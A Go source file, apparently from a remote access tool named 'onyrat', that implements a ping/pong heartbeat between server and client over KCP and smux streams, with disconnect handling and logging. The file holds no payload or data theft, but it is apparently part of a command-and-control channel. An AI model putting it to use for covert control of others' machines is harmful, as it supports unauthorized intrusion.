package network

import (
	"context"
	"errors"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/xtaci/smux"
)

type HeartbeatManager struct {
	Communicator Communicator
	Manager      *StreamManager
	Ctx          context.Context
	cancel       context.CancelCauseFunc
	done         chan error
}

func (hm *HeartbeatManager) Run() {
	inCtx, cancel := context.WithCancelCause(hm.Ctx)
	hm.cancel = cancel
	defer func() {
		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
			hm.done <- fmt.Errorf("failed to run heartbeat: %w", err)
		} else {
			hm.done <- nil
		}
	}()
	defer cancel(nil)

	addr := hm.Manager.session.RemoteAddr().String()

	var server *KCPServer
	var client *KCPClient
	var mode int = 1 // 0 client, 1 server
	var ok bool

	server, ok = hm.Communicator.(*KCPServer)
	if !ok {
		client, ok = hm.Communicator.(*KCPClient)
		if !ok {
			hm.cancel(fmt.Errorf("invalid communicator"))
			return
		}
		mode = 0
	}

	if client == nil && server != nil {
		client = server.GetClient(addr)
		if client == nil {
			cancel(fmt.Errorf("failed to get connection between client: %s", addr))
			return
		}
	}

	var stream *smux.Stream
	var err error
	if mode == 1 {
		stream, err = client.Manager.AcceptStream(heartbeatStream, 10*time.Second)
		if err != nil {
			server.CloseClient(addr)
			cancel(fmt.Errorf("failed to accept heartbeat stream from: %s: %w", addr, err))
			return
		}
	} else {
		stream, err = client.Manager.OpenStream(heartbeatStream, 10*time.Second)
		if err != nil {
			client.Close()
			cancel(fmt.Errorf("failed to open heartbeat stream: %w", err))
			return
		}
	}

	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	sendClientMessage := []byte("ping")
	sendServerMessage := []byte("pong")
	disconnectMessage := []byte("diss")
	buf := make([]byte, 12) // Accounting for serialization

	for range ticker.C {
		select {

		case <-inCtx.Done():
			if mode == 0 {
				client.SendSerialized(stream, disconnectMessage, 15*time.Second)
			} else {
				server.SendSerialized(stream, disconnectMessage, 15*time.Second)
			}
			client.Close()
			return

		default:
			if mode == 0 {
				if err := client.SendSerialized(stream, sendClientMessage, 15*time.Second); err != nil {
					client.Close()
					cancel(fmt.Errorf("failed to send ping to server: %w", err))
					return
				}

				// Receive pong
				n, err := client.ReceiveSerialized(stream, buf, 15*time.Second)
				if err != nil {
					client.Close()
					cancel(fmt.Errorf("failed to receive pong from the server: %w", err))
					return
				}

				if string(buf[:n]) == "pong" {
					logger.Log.Debug("Proof of life received from server.")
					client.LastSeen = time.Now()
					continue

				} else if string(buf[:n]) == "diss" {
					client.Close()
					cancel(fmt.Errorf("disconnected by server"))
					return

				} else {
					client.Close()
					cancel(fmt.Errorf("unexpected message received from the server on the heartbeat stream: %x", buf[:n]))
					return // return so we do not trigger sending disconnect mesage to server
				}

			} else {
				n, err := server.ReceiveSerialized(stream, buf, 15*time.Second)
				if err != nil {
					server.CloseClient(addr)
					cancel(fmt.Errorf("failed to receive ping from client: %s: %w", addr, err))
					return
				}

				if string(buf[:n]) == "ping" {
					logger.Log.Debugf("Proof of life received from client: %s", addr)
					client.LastSeen = time.Now()

					if err := server.SendSerialized(stream, sendServerMessage, 15*time.Second); err != nil {
						client.Close()
						cancel(fmt.Errorf("failed to send pong to client: %s: %w", addr, err))
					}

				} else if string(buf[:n]) == "diss" {
					server.CloseClient(addr)
					cancel(fmt.Errorf("disconnected by client: %s", addr))
					return

				} else {
					server.CloseClient(addr)
					cancel(fmt.Errorf("unexpected message received on the heartbeat stream from client: %s: %x", addr, buf[:n]))
					return
				}

			}

		}
	}
}

func (hm *HeartbeatManager) Start() {
	if hm.done == nil {
		hm.done = make(chan error, 1)
	}
	go hm.Run()
}

func (hm *HeartbeatManager) Wait() error {
	if hm.done != nil {
		return <-hm.done
	}
	return fmt.Errorf("heartbeat manager not initialized")
}

func (hm *HeartbeatManager) Stop() {
	if hm.cancel != nil {
		hm.cancel(fmt.Errorf("stopped by user"))
	}
	hm.cancel = nil // Make nil so we do not error if Stop is called again after being initialized only once
}
